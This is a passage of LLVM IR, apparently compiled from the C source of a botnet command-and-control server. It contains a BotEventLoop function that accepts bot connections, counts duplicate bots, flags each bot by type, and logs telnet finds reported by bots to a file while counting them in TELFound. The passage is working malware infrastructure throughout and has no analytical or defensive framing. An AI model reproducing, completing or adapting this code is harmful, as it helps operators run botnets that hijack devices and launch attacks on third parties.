  %62 = call i64 @send(i32 %61, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 9, i32 16384)
  %63 = load i32, i32* %12, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #8
  %67 = call i64 @send(i32 %63, i8* %64, i64 %66, i32 16384)
  %68 = load i32, i32* %12, align 4
  %69 = call i64 @send(i32 %68, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %70

70:                                               ; preds = %60, %53, %50
  %71 = load i32, i32* %12, align 4
  %72 = load i8*, i8** %4, align 8
  %73 = load i8*, i8** %4, align 8
  %74 = call i64 @strlen(i8* %73) #8
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = load i32, i32* %12, align 4
  %77 = call i64 @send(i32 %76, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0), i64 1, i32 16384)
  br label %78

78:                                               ; preds = %70, %49
  %79 = load i32, i32* %12, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %12, align 4
  br label %35, !llvm.loop !11

81:                                               ; preds = %35
  %82 = load i8*, i8** %8, align 8
  call void @free(i8* %82) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [8192 x i8], align 16
  %7 = alloca [8192 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr, align 2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.clientdata_t*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i64, align 8
  %19 = alloca [2048 x i8], align 16
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %33 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %34 = bitcast i8* %33 to %struct.epoll_event*
  store %struct.epoll_event* %34, %struct.epoll_event** %4, align 8
  br label %35

35:                                               ; preds = %1, %431
  %36 = load volatile i32, i32* @epollFD, align 4
  %37 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %38 = call i32 @epoll_wait(i32 %36, %struct.epoll_event* %37, i32 1000000, i32 -1)
  store i32 %38, i32* %8, align 4
  store i32 0, i32* %9, align 4
  br label %39

39:                                               ; preds = %428, %35
  %40 = load i32, i32* %9, align 4
  %41 = load i32, i32* %8, align 4
  %42 = icmp slt i32 %40, %41
  br i1 %42, label %43, label %431

43:                                               ; preds = %39
  %44 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %45 = load i32, i32* %9, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i64 %46
  %48 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %47, i32 0, i32 0
  %49 = load i32, i32* %48, align 1
  %50 = and i32 %49, 8
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %70, label %52

52:                                               ; preds = %43
  %53 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %54 = load i32, i32* %9, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i64 %55
  %57 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %56, i32 0, i32 0
  %58 = load i32, i32* %57, align 1
  %59 = and i32 %58, 16
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %70, label %61

61:                                               ; preds = %52
  %62 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %63 = load i32, i32* %9, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i64 %64
  %66 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %65, i32 0, i32 0
  %67 = load i32, i32* %66, align 1
  %68 = and i32 %67, 1
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %89, label %70

70:                                               ; preds = %61, %52, %43
  %71 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %72 = load i32, i32* %9, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %71, i64 %73
  %75 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %74, i32 0, i32 1
  %76 = bitcast %union.epoll_data* %75 to i32*
  %77 = load i32, i32* %76, align 1
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %78
  %80 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %79, i32 0, i32 1
  store i8 0, i8* %80, align 4
  %81 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %82 = load i32, i32* %9, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %81, i64 %83
  %85 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %84, i32 0, i32 1
  %86 = bitcast %union.epoll_data* %85 to i32*
  %87 = load i32, i32* %86, align 1
  %88 = call i32 @close(i32 %87)
  br label %428

89:                                               ; preds = %61
  %90 = load volatile i32, i32* @listenFD, align 4
  %91 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %92 = load i32, i32* %9, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %91, i64 %93
  %95 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %94, i32 0, i32 1
  %96 = bitcast %union.epoll_data* %95 to i32*
  %97 = load i32, i32* %96, align 1
  %98 = icmp eq i32 %90, %97
  br i1 %98, label %99, label %202

99:                                               ; preds = %89
  br label %100

100:                                              ; preds = %99, %165, %168, %192
  store i32 16, i32* %11, align 4
  %101 = load volatile i32, i32* @listenFD, align 4
  %102 = call i32 @accept(i32 %101, %struct.sockaddr* %10, i32* %11)
  store i32 %102, i32* %12, align 4
  %103 = load i32, i32* %12, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %115

105:                                              ; preds = %100
  %106 = call i32* @__errno_location() #10
  %107 = load i32, i32* %106, align 4
  %108 = icmp eq i32 %107, 11
  br i1 %108, label %113, label %109

109:                                              ; preds = %105
  %110 = call i32* @__errno_location() #10
  %111 = load i32, i32* %110, align 4
  %112 = icmp eq i32 %111, 11
  br i1 %112, label %113, label %114

113:                                              ; preds = %109, %105
  br label %201

114:                                              ; preds = %109
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %201

115:                                              ; preds = %100
  %116 = bitcast %struct.sockaddr* %10 to %struct.sockaddr_in*
  %117 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %116, i32 0, i32 2
  %118 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %117, i32 0, i32 0
  %119 = load i32, i32* %118, align 2
  %120 = load i32, i32* %12, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %121
  %123 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %122, i32 0, i32 0
  store i32 %119, i32* %123, align 4
  store i32 0, i32* %14, align 4
  store i32 0, i32* %13, align 4
  br label %124

124:                                              ; preds = %155, %115
  %125 = load i32, i32* %13, align 4
  %126 = icmp slt i32 %125, 1000000
  br i1 %126, label %127, label %158

127:                                              ; preds = %124
  %128 = load i32, i32* %13, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 1
  %132 = load i8, i8* %131, align 4
  %133 = icmp ne i8 %132, 0
  br i1 %133, label %134, label %138

134:                                              ; preds = %127
  %135 = load i32, i32* %13, align 4
  %136 = load i32, i32* %12, align 4
  %137 = icmp eq i32 %135, %136
  br i1 %137, label %138, label %139

138:                                              ; preds = %134, %127
  br label %155

139:                                              ; preds = %134
  %140 = load i32, i32* %13, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %141
  %143 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 4
  %145 = load i32, i32* %12, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %146
  %148 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %147, i32 0, i32 0
  %149 = load i32, i32* %148, align 4
  %150 = icmp eq i32 %144, %149
  br i1 %150, label %151, label %154

151:                                              ; preds = %139
  store i32 1, i32* %14, align 4
  %152 = load volatile i32, i32* @dups, align 4
  %153 = add nsw i32 %152, 1
  store volatile i32 %153, i32* @dups, align 4
  br label %158

154:                                              ; preds = %139
  br label %155

155:                                              ; preds = %154, %138
  %156 = load i32, i32* %13, align 4
  %157 = add nsw i32 %156, 1
  store i32 %157, i32* %13, align 4
  br label %124, !llvm.loop !12

158:                                              ; preds = %151, %124
  %159 = load i32, i32* %14, align 4
  %160 = icmp ne i32 %159, 0
  br i1 %160, label %161, label %171

161:                                              ; preds = %158
  %162 = load i32, i32* %12, align 4
  %163 = call i64 @send(i32 %162, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i64 0, i64 0), i64 13, i32 16384)
  %164 = icmp eq i64 %163, -1
  br i1 %164, label %165, label %168

165:                                              ; preds = %161
  %166 = load i32, i32* %12, align 4
  %167 = call i32 @close(i32 %166)
  br label %100

168:                                              ; preds = %161
  %169 = load i32, i32* %12, align 4
  %170 = call i32 @close(i32 %169)
  br label %100

171:                                              ; preds = %158
  %172 = load i32, i32* %12, align 4
  %173 = call i32 @make_socket_non_blocking(i32 %172)
  store i32 %173, i32* %5, align 4
  %174 = load i32, i32* %5, align 4
  %175 = icmp eq i32 %174, -1
  br i1 %175, label %176, label %179

176:                                              ; preds = %171
  %177 = load i32, i32* %12, align 4
  %178 = call i32 @close(i32 %177)
  br label %201

179:                                              ; preds = %171
  %180 = load i32, i32* %12, align 4
  %181 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %182 = bitcast %union.epoll_data* %181 to i32*
  store i32 %180, i32* %182, align 1
  %183 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %183, align 1
  %184 = load volatile i32, i32* @epollFD, align 4
  %185 = load i32, i32* %12, align 4
  %186 = call i32 @epoll_ctl(i32 %184, i32 1, i32 %185, %struct.epoll_event* %3) #9
  store i32 %186, i32* %5, align 4
  %187 = load i32, i32* %5, align 4
  %188 = icmp eq i32 %187, -1
  br i1 %188, label %189, label %192

189:                                              ; preds = %179
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %190 = load i32, i32* %12, align 4
  %191 = call i32 @close(i32 %190)
  br label %201

192:                                              ; preds = %179
  %193 = load i32, i32* %12, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %194
  %196 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %195, i32 0, i32 1
  store i8 1, i8* %196, align 4
  %197 = load i32, i32* %12, align 4
  %198 = call i64 @send(i32 %197, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i64 0, i64 0), i64 15, i32 16384)
  %199 = load i32, i32* %12, align 4
  %200 = call i64 @send(i32 %199, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0), i64 15, i32 16384)
  br label %100

201:                                              ; preds = %189, %176, %114, %113
  br label %428

202:                                              ; preds = %89
  %203 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %204 = load i32, i32* %9, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %203, i64 %205
  %207 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %206, i32 0, i32 1
  %208 = bitcast %union.epoll_data* %207 to i32*
  %209 = load i32, i32* %208, align 1
  store i32 %209, i32* %15, align 4
  %210 = load i32, i32* %15, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %211
  store %struct.clientdata_t* %212, %struct.clientdata_t** %16, align 8
  store i32 0, i32* %17, align 4
  %213 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %214 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %213, i32 0, i32 1
  store i8 1, i8* %214, align 4
  br label %215

215:                                              ; preds = %202, %424
  %216 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %216, i8 0, i64 2048, i1 false)
  br label %217

217:                                              ; preds = %385, %384, %369, %359, %349, %339, %329, %319, %309, %299, %289, %279, %269, %259, %249, %243, %215
  %218 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %218, i8 0, i64 2048, i1 false)
  %219 = icmp ne i8* %218, null
  br i1 %219, label %220, label %226

220:                                              ; preds = %217
  %221 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %222 = load i32, i32* %15, align 4
  %223 = call i32 @fdgets(i8* %221, i32 2048, i32 %222)
  %224 = sext i32 %223 to i64
  store i64 %224, i64* %18, align 8
  %225 = icmp sgt i64 %224, 0
  br label %226

226:                                              ; preds = %220, %217
  %227 = phi i1 [ false, %217 ], [ %225, %220 ]
  br i1 %227, label %228, label %388

228:                                              ; preds = %226
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %230 = call i8* @strstr(i8* %229, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0)) #8
  %231 = icmp eq i8* %230, null
  br i1 %231, label %232, label %233

232:                                              ; preds = %228
  store i32 1, i32* %17, align 4
  br label %388

233:                                              ; preds = %228
  %234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  call void @trim(i8* %234)
  %235 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %236 = call i32 @strcmp(i8* %235, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %237 = icmp eq i32 %236, 0
  br i1 %237, label %238, label %244

238:                                              ; preds = %233
  %239 = load i32, i32* %15, align 4
  %240 = call i64 @send(i32 %239, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0), i64 5, i32 16384)
  %241 = icmp eq i64 %240, -1
  br i1 %241, label %242, label %243

242:                                              ; preds = %238
  store i32 1, i32* %17, align 4
  br label %388

243:                                              ; preds = %238
  br label %217, !llvm.loop !13

244:                                              ; preds = %233
  %245 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %246 = call i8* @strstr(i8* %245, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0)) #8
  %247 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %248 = icmp eq i8* %246, %247
  br i1 %248, label %249, label %254

249:                                              ; preds = %244
  %250 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %251 = call i8* @strstr(i8* %250, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0)) #8
  store i8* %251, i8** %20, align 8
  %252 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %253 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %252, i32 0, i32 2
  store i8 1, i8* %253, align 1
  br label %217, !llvm.loop !13

254:                                              ; preds = %244
  %255 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %256 = call i8* @strstr(i8* %255, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i64 0, i64 0)) #8
  %257 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %258 = icmp eq i8* %256, %257
  br i1 %258, label %259, label %264

259:                                              ; preds = %254
  %260 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %261 = call i8* @strstr(i8* %260, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i64 0, i64 0)) #8
  store i8* %261, i8** %21, align 8
  %262 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %263 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %262, i32 0, i32 2
  store i8 1, i8* %263, align 1
  br label %217, !llvm.loop !13

264:                                              ; preds = %254
  %265 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %266 = call i8* @strstr(i8* %265, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0)) #8
  %267 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %268 = icmp eq i8* %266, %267
  br i1 %268, label %269, label %274

269:                                              ; preds = %264
  %270 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %271 = call i8* @strstr(i8* %270, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0)) #8
  store i8* %271, i8** %22, align 8
  %272 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %273 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %272, i32 0, i32 8
  store i8 1, i8* %273, align 1
  br label %217, !llvm.loop !13

274:                                              ; preds = %264
  %275 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %276 = call i8* @strstr(i8* %275, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.13, i64 0, i64 0)) #8
  %277 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %278 = icmp eq i8* %276, %277
  br i1 %278, label %279, label %284

279:                                              ; preds = %274
  %280 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %281 = call i8* @strstr(i8* %280, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.13, i64 0, i64 0)) #8
  store i8* %281, i8** %23, align 8
  %282 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %283 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %282, i32 0, i32 3
  store i8 1, i8* %283, align 2
  br label %217, !llvm.loop !13

284:                                              ; preds = %274
  %285 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %286 = call i8* @strstr(i8* %285, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0)) #8
  %287 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %288 = icmp eq i8* %286, %287
  br i1 %288, label %289, label %294

289:                                              ; preds = %284
  %290 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %291 = call i8* @strstr(i8* %290, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0)) #8
  store i8* %291, i8** %24, align 8
  %292 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %293 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %292, i32 0, i32 3
  store i8 1, i8* %293, align 2
  br label %217, !llvm.loop !13

294:                                              ; preds = %284
  %295 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %296 = call i8* @strstr(i8* %295, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0)) #8
  %297 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %298 = icmp eq i8* %296, %297
  br i1 %298, label %299, label %304

299:                                              ; preds = %294
  %300 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %301 = call i8* @strstr(i8* %300, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0)) #8
  store i8* %301, i8** %25, align 8
  %302 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %303 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %302, i32 0, i32 3
  store i8 1, i8* %303, align 2
  br label %217, !llvm.loop !13

304:                                              ; preds = %294
  %305 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %306 = call i8* @strstr(i8* %305, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i64 0, i64 0)) #8
  %307 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %308 = icmp eq i8* %306, %307
  br i1 %308, label %309, label %314

309:                                              ; preds = %304
  %310 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %311 = call i8* @strstr(i8* %310, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i64 0, i64 0)) #8
  store i8* %311, i8** %26, align 8
  %312 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %313 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %312, i32 0, i32 4
  store i8 1, i8* %313, align 1
  br label %217, !llvm.loop !13

314:                                              ; preds = %304
  %315 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %316 = call i8* @strstr(i8* %315, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.17, i64 0, i64 0)) #8
  %317 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %318 = icmp eq i8* %316, %317
  br i1 %318, label %319, label %324

319:                                              ; preds = %314
  %320 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %321 = call i8* @strstr(i8* %320, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.17, i64 0, i64 0)) #8
  store i8* %321, i8** %27, align 8
  %322 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %323 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %322, i32 0, i32 5
  store i8 1, i8* %323, align 4
  br label %217, !llvm.loop !13

324:                                              ; preds = %314
  %325 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %326 = call i8* @strstr(i8* %325, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.18, i64 0, i64 0)) #8
  %327 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %328 = icmp eq i8* %326, %327
  br i1 %328, label %329, label %334

329:                                              ; preds = %324
  %330 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %331 = call i8* @strstr(i8* %330, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.18, i64 0, i64 0)) #8
  store i8* %331, i8** %28, align 8
  %332 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %333 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %332, i32 0, i32 6
  store i8 1, i8* %333, align 1
  br label %217, !llvm.loop !13

334:                                              ; preds = %324
  %335 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %336 = call i8* @strstr(i8* %335, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i64 0, i64 0)) #8
  %337 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %338 = icmp eq i8* %336, %337
  br i1 %338, label %339, label %344

339:                                              ; preds = %334
  %340 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %341 = call i8* @strstr(i8* %340, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i64 0, i64 0)) #8
  store i8* %341, i8** %29, align 8
  %342 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %343 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %342, i32 0, i32 7
  store i8 1, i8* %343, align 2
  br label %217, !llvm.loop !13

344:                                              ; preds = %334
  %345 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %346 = call i8* @strstr(i8* %345, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i64 0, i64 0)) #8
  %347 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %348 = icmp eq i8* %346, %347
  br i1 %348, label %349, label %354

349:                                              ; preds = %344
  %350 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %351 = call i8* @strstr(i8* %350, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i64 0, i64 0)) #8
  store i8* %351, i8** %30, align 8
  %352 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %353 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %352, i32 0, i32 7
  store i8 1, i8* %353, align 2
  br label %217, !llvm.loop !13

354:                                              ; preds = %344
  %355 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %356 = call i8* @strstr(i8* %355, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i64 0, i64 0)) #8
  %357 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %358 = icmp eq i8* %356, %357
  br i1 %358, label %359, label %364

359:                                              ; preds = %354
  %360 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %361 = call i8* @strstr(i8* %360, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i64 0, i64 0)) #8
  store i8* %361, i8** %31, align 8
  %362 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %363 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %362, i32 0, i32 7
  store i8 1, i8* %363, align 2
  br label %217, !llvm.loop !13

364:                                              ; preds = %354
  %365 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %366 = call i8* @strstr(i8* %365, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.22, i64 0, i64 0)) #8
  %367 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %368 = icmp eq i8* %366, %367
  br i1 %368, label %369, label %380

369:                                              ; preds = %364
  %370 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %371 = call i8* @strstr(i8* %370, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.22, i64 0, i64 0)) #8
  %372 = getelementptr inbounds i8, i8* %371, i64 7
  store i8* %372, i8** %32, align 8
  %373 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %374 = load i8*, i8** %32, align 8
  %375 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %373, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.23, i64 0, i64 0), i8* %374)
  %376 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %377 = call i32 @fflush(%struct._IO_FILE* %376)
  %378 = load volatile i32, i32* @TELFound, align 4
  %379 = add nsw i32 %378, 1
  store volatile i32 %379, i32* @TELFound, align 4
  br label %217, !llvm.loop !13

380:                                              ; preds = %364
  %381 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %382 = call i32 @strcmp(i8* %381, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i64 0, i64 0)) #8
  %383 = icmp eq i32 %382, 0
  br i1 %383, label %384, label %385

384:                                              ; preds = %380
  br label %217, !llvm.loop !13

385:                                              ; preds = %380
  %386 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %387 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.25, i64 0, i64 0), i8* %386)
